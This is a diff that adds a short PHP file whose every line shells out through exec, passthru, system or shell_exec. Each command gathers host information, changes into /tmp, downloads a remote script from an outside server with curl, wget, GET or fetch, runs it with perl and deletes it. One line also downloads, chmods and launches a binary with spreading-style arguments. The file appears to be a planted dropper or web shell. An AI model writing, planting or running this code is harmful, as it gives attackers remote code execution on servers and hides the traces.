@@ -1,0 +1,19 @@
+<?php
+echo exec('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;curl -O http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo exec('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;GET http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo exec('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo exec('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;fetch http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo passthru('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;fetch http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo passthru('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;wget hhttp://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo passthru('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;curl -O http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo passthru('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;GET http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo system('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;curl -O http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo system('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;GET http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo system('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;wget http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo system('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;fetch http://www.ggps.ptc.edu.tw/help/s.txt;wget http://www.ggps.ptc.edu.tw/help/s.txt;chmod 777 s;./s -m n0body -f  SpreadProcess;perl s.txt;rm s.txt');
+echo shell_exec('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;curl -O http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo shell_exec('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;GET http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo shell_exec('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;wget http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+echo shell_exec('(pwd;ls -lia;w;uname -a) >> s.txt;cd /tmp;fetch http://www.ggps.ptc.edu.tw/help/s.txt;perl s.txt;rm s.txt');
+?>
+
